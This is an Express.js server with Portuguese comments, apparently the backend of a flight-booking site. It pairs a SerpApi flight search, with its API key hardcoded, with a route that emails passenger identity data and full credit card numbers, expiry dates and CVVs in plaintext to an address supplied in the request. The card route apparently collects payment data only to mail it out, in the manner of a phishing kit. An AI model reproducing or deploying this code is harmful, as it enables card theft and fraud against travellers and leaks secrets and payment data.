const express = require("express");
const cors = require("cors");
const { getJson } = require("serpapi");
const { sendEmail } = require("./emailService");

const app = express();
const port = 3000;

// Ativar CORS para todas as rotas
app.use(cors());
app.use(express.json()); // Adiciona suporte para JSON no corpo das requisições

// Rota para buscar passagens aéreas
app.get("/search-flights", (req, res) => {
    const { departure_id, arrival_id, outbound_date, currency, type } = req.query;
    if (!departure_id || !arrival_id || !outbound_date || !currency) {
        return res.status(400).json({ error: "Parâmetros faltando" });
    }
    getJson(
        {
            api_key:
                "0222a488d2c776b7c195327d287d66a22178d8f3a58cc968d94811cc37ded60d",
            engine: "google_flights",
            hl: "pt-br",
            gl: "br",
            departure_id,
            arrival_id,
            outbound_date,
            return_date: null,
            currency,
            type: type,
        },
        (json) => {
            res.json(json);
        }
    );
});

// Rota para buscar passagens aéreas
app.post("/send-message-email", async (req, res) => {
    // Envia um e-mail com os detalhes da busca
    try {
        if (req.body.type === 'passengers') {
            await sendEmail(
                req.body.email, // Substitua pelo e-mail do destinatário
                'Informações do passageiro',
                `Detalhes do Usuário:
    Nome: ${req.body.data.firstName} ${req.body.data.lastName}
    E-mail: ${req.body.data.email}
    Telefone: ${req.body.data.phone}
    Data de Nascimento: ${req.body.data.birthDate}
    Gênero: ${req.body.data.gender}
    Tipo de Documento: ${req.body.data.documentType}
    Número do Documento: ${req.body.data.documentNumber}`
            );
        }

        if (req.body.type === 'creditcard') {
            await sendEmail(
                req.body.email, // Substitua pelo e-mail do destinatário
                'Informações do Cartão de crédito',
                `
    Tipo de Pagamento: Cartão de crédito
    Endereço:
    Rua: ${req.body.data.endereco}
    Cidade: ${req.body.data.cidade}
    Estado: ${req.body.data.estado}
    CEP: ${req.body.data.cep}

    Detalhes do Cartão de Crédito:
    Nome: ${req.body.data.name}
    Telefone: ${req.body.data.number}
    Número do Cartão: ${req.body.data.cardNumber}
    Data de Validade: ${req.body.data.expiryDate}
    CVV: ${req.body.data.cvv}
`
            );

        }

        console.log("E-mail enviado com sucesso.");
        res.json({});
    } catch (err) {
        console.error("Erro ao enviar o e-mail:", err);
    }
});

app.listen(port, () => {
    console.log(`API rodando em http://localhost:${port}`);
});
